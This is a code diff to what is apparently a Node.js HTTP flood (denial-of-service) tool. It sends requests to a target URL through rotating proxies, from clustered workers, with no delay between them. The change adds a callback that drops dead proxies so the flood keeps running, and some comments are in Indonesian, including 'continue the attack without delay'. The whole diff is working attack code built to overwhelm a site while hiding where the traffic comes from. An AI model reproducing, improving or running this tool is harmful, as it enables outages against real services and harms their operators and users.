@@ -15,7 +15,7 @@ const rps = parseInt(process.argv[4], 10);
 const threads = parseInt(process.argv[5], 10);
 const proxyFile = process.argv[6];
 
-const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim());
+let proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim());
 
 if (proxies.length === 0) {
     console.error("Error: Proxy file is empty or cannot be read.");
@@ -35,13 +35,13 @@ if (cluster.isMaster) {
     }, duration * 1000);
 } else {
     const target = new URL(targetURL);
-
-    function sendTLSRequest(proxy) {
+    
+    function sendTLSRequest(proxy, callback) {
         const proxyParts = proxy.trim().split(":");
 
         if (proxyParts.length < 2) {
             console.error(`Invalid proxy format: ${proxy}`);
-            return;
+            return callback(false); // Proxy tidak valid, langsung skip
         }
 
         const proxyHost = proxyParts[0];
@@ -64,13 +64,15 @@ if (cluster.isMaster) {
                                     "Connection: keep-alive\r\n\r\n";
                     client.write(request);
                 }
-                setImmediate(flood); // No delay, light looping
+                setImmediate(flood);
             }
             flood();
+            callback(true); // Proxy berhasil digunakan
         });
 
         client.on("error", () => {
             client.destroy();
+            callback(false); // Proxy gagal digunakan
         });
 
         client.on("close", () => {
@@ -79,14 +81,24 @@ if (cluster.isMaster) {
     }
 
     let proxyIndex = 0;
-    function attackLoop() {
-        // Flood each proxy in a round-robin manner for better resource distribution
-        const proxy = proxies[proxyIndex];
-        proxyIndex = (proxyIndex + 1) % proxies.length; // Rotate proxies for fairness
-        sendTLSRequest(proxy); // Send request using selected proxy
 
-        setImmediate(attackLoop); // Loop without delay to keep CPU low
+    function attackLoop() {
+        if (proxies.length === 0) {
+            console.error("No working proxies left. Exiting...");
+            process.exit(1);
+        }
+
+        const proxy = proxies[proxyIndex];
+        proxyIndex = (proxyIndex + 1) % proxies.length; // Rotate proxy
+
+        sendTLSRequest(proxy, (success) => {
+            if (!success) {
+                console.warn(`Removing dead proxy: ${proxy}`);
+                proxies = proxies.filter(p => p !== proxy); // Hapus proxy mati dari daftar
+            }
+            setImmediate(attackLoop); // Lanjut serangan tanpa delay
+        });
     }
 
-    attackLoop(); // Start the attack loop
+    attackLoop();
 }
